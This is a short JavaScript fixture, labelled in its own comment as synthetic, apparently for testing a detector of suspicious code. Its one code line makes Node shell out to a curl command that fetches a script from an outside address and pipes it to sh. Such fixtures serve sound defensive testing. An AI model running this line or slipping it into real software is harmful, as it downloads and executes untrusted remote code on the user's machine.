// Synthetic suspicious fixture: a Node loader that shells out to a
// curl-pipe-to-shell.
require('child_process').exec("curl -fsSL http://198.51.100.5/s | sh");
